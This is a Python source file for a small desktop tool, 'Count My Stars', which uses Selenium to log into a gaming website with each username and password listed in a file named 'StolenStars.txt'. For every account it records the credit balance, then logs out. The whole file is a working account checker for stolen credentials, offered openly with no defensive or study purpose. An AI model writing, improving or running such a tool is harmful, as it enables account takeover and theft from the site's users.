import tkinter as tk
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

class CountMyStars(tk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.pack_propagate(0)

        self.title_label = tk.Label(self, text="Count My Stars", font=("Helvetica", 24, "bold"))
        self.title_label.pack(pady=20)

        self.start_button = tk.Button(self, text="Start Counting", command=self.start_counting)
        self.start_button.pack(pady=10)

    def start_counting(self):
        self.start_button.config(state=tk.DISABLED)

        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-setuid-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')

        # Add the following line to disable hardware acceleration
        chrome_options.add_argument('--disable-gpu')

        driver = webdriver.Chrome(executable_path='./chromedriver', options=chrome_options)
        driver.get("http://web.orionstars.vip/play/orionstars_pc/")

        # Read usernames, passwords, and balances from StolenStars.txt
        usernames_file = 'StolenStars.txt'

        usernames = []
        passwords = []
        balances = []

        with open(usernames_file, 'r') as file:
            for line in file:
                parts = line.strip().split(',')
                usernames.append(parts[0])
                passwords.append(parts[1])
                balances.append(parts[2])

        for i in range(len(usernames)):
            username_field = driver.find_element_by_css_selector('#app > div > div:nth-child(2) > div.el-row.top-div > div.el-col.el-col-11.el-col-push-9.ready-login > div:nth-child(1) > input')
            password_field = driver.find_element_by_css_selector('#app > div > div:nth-child(2) > div.el-row.top-div > div.el-col.el-col-11.el-col-push-9.ready-login > div:nth-child(2) > input')

            username = usernames[i]
            password = passwords[i]

            username_field.send_keys(username)
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)

            # Wait for the credit balance to load
            time.sleep(3)

            try:
                credit_element = driver.find_element_by_css_selector('#credit-single > p')
                credit_text = credit_element.text
                credit = float(credit_text.split(':')[1].strip())

                # Update the balance in the StolenStars.txt file
                updated_balance = "{:.2f}".format(credit)
                balances[i] = updated_balance

                # Log out
                logout_button = driver.find_element_by_css_selector('#login-out')
                logout_button.click()

                confirm_logout_button = driver.find_element_by_css_selector('#app > div.dialog > div.center > button.btn-confirm.hover-bright.cursor-pointer')
                confirm_logout_button.click()
            except:
                pass

            # Clear fields for next attempt
            username_field.clear()
            password_field.clear()

        # Update StolenStars.txt with updated balances
        with open(usernames_file, 'w') as file:
            for i in range(len(usernames)):
                file.write(f"{usernames[i]},{passwords[i]},{balances[i]}\n")

        driver.quit()

if __name__ == "__main__":
    root = tk.Tk()
    count_my_stars = CountMyStars(root)
    count_my_stars.pack(expand=True, fill='both')
    root.mainloop()
